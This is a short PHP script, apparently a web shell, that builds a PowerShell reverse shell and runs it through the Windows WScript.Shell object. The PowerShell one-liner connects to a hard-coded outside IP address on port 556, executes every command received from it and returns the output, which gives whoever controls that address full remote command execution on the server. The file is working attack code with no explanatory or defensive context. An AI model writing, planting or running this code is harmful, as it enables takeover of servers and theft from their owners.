<?php
 $command = "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('157.15.124.24',556);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";

 $wshell = new COM("WScript.Shell") or die("Gagal buat objek WScript.Shell");
 $exec = $wshell->exec("cmd /c " . $command);
 $stdout = $exec->StdOut();
 $stroutput = $stdout->ReadAll();
echo $stroutput;
?>
